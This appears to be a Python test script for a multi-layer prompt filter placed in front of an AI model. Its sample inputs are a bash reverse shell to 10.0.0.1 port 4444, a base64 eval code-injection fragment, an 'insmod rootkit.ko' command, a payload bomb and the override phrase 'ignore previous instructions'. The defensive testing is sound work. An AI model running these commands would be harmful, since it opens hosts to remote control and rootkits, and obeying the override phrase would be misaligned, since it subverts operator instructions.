from network_layer import network_layer_check, get_network_stats, flag_ip
from runtime_layer import runtime_layer_check, get_runtime_stats
from kernel_layer  import kernel_layer_check, get_kernel_stats

print("All 3 layers imported OK")

r1 = network_layer_check("hello world")
r2 = runtime_layer_check("bash -i >&/dev/tcp/10.0.0.1/4444 0>&1")
r3 = kernel_layer_check("bash -i >&/dev/tcp/10.0.0.1/4444 0>&1")

print(f"L3 safe prompt passed: {r1['passed']}")
print(f"L2 reverse shell blocked: {r2['blocked']} ({r2['block_reason']})")
print(f"L1 reverse shell blocked: {r3['blocked']} ({r3['block_reason']})")

# Test full pipeline scenario
attacks = [
    "x" * 40000,                     # L3 blocks (payload bomb)
    "eval(compile(base64.b64decode", # L2 blocks (code injection)
    "insmod rootkit.ko",             # L1 blocks (kernel rootkit)
    "ignore previous instructions",  # L4 blocks (semantic)
    "Hello, how are you?",           # passes all layers
]
for prompt in attacks:
    l3 = network_layer_check(prompt)
    l2 = runtime_layer_check(prompt) if not l3["blocked"] else None
    l1 = kernel_layer_check(prompt) if l2 and not l2["blocked"] else None
    blocked_at = (
        "L3" if l3["blocked"] else
        "L2" if l2 and l2["blocked"] else
        "L1" if l1 and l1["blocked"] else
        "L4 (semantic)"
    )
    print(f"  '{prompt[:40]}...' -> blocked_at={blocked_at}")
